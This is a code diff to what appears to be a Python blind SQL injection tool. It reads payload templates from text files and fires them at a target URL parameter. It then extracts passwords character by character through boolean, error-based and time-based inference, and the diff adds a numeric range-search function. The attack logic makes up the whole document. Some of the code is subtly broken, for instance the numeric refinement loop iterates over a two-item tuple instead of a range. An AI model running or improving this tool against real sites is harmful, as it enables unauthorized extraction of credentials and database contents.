@@ -33,9 +33,11 @@ def Get_Easy_Bf(url , header , p):
 #Get boolean with payload from boolean.txt
 def Get_Boolean(url , header , p):
     f1 = open("boolean.txt" , "r")
-    list=[]        
+    list=[]
+    num = 0        
     for ch in f1:                
-        print(ch)
+        print(num , ch)
+        num = num + 1
         list.append(ch)
     print("99. custom payload")           
     user_ch = int(input("your choice : "))            
@@ -51,7 +53,7 @@ def Get_Boolean(url , header , p):
         for j in char:
             pass_1 = password + j
             pw  = pw_choose.replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
-            get = session.get(url = url , headers=header , params=f"{p}={pw[2:]}")            
+            get = session.get(url = url , headers=header , params=f"{p}={pw}")            
             if (sp in get.text):
                 print(len(get.text) , pw[2:] ,get.url)                      
                 password = password + j
@@ -63,21 +65,24 @@ def Get_Boolean(url , header , p):
 #Get Error-based sql with payload from error-based.txt
 def Get_Error_based(url , header , p):
     f1 = open("error-based.txt", "r")
-    list=[]        
+    list=[]
+    num = 0        
     for ch in f1:                
-        print(ch)
+        print(num , ch)
+        num = num + 1
         list.append(ch)
     user_ch = int(input("your choose : "))
-    sp = input("special: ")
+    sp1 = input("special appear : ")
+    sp2 = input("special dissappear : ")
     len_pw = int(input("length :"))
     password = ""
     s_p = input("Sepecial params : ")
     for i in range(1, len_pw):
         for j in char:
             pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
-            get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
+            get = session.get(url=url, headers=header, params=f"{p}={pw}")
             #print( get.url , get.status_code)
-            if (sp in get.text):
+            if sp1 in get.text or sp2 not in get.text:
                 print(len(get.text), pw[2:], get.url)
                 password = password + j
                 print(password)
@@ -114,9 +119,11 @@ def Get_Filter(list_filter):
 #Get Time base with payload from time-based.txt
 def Get_Time_based(url , header , p):
     f1 = open("time-based.txt", "r")
-    list=[]        
+    list=[]
+    num = 0        
     for ch in f1:                
-        print(ch)
+        print(num , ch)
+        num = num +1
         list.append(ch)
     
     user_ch = int(input("your choose : "))
@@ -128,7 +135,7 @@ def Get_Time_based(url , header , p):
         for j in char:
             start = time.time()
             pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "").replace("{col}" , col)
-            get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")            
+            get = session.get(url=url, headers=header, params=f"{p}={pw}")            
             timing = time.time() - start
             print(timing)
             if timing > 2:
@@ -138,3 +145,32 @@ def Get_Time_based(url , header , p):
                 break    
 
     f1.close()
+
+def Get_Numeric(url , header , p):
+    f1 = open("numeric.txt", "r")
+    list=[]
+    num = 0         
+    for ch in f1:                
+        print(num , ch)
+        num = num +1
+        list.append(ch)
+    user_ch = int(input("your choose : "))
+    s_p = input("Sepecial params : ")
+    sp = input("Sepecial disappear : ")
+    for i in range(0,100000000000000,1000):
+        pw=list[user_ch].replace("{pw}" , s_p).replace("{i}" , str(i)).replace("\n" , "").replace("{quote}", ">")
+        get = session.get(url = url , headers=header , params=f"{p}={pw}")
+        print(i)
+        if sp not in get.text:
+            print("about : " , i-1000 , i )
+            for j in (i-1000 , i):
+                print(j)                    
+                pw=list[user_ch].replace("{pw}" , s_p).replace("{i}" , str(j)).replace("\n" , "").replace("{quote}", "=")
+                get = session.get(url = url , headers=header , params=f"{p}={pw}") 
+                if sp not in get.text:
+                    print("numeric : " , j-1)
+                    break
+
+
+
+
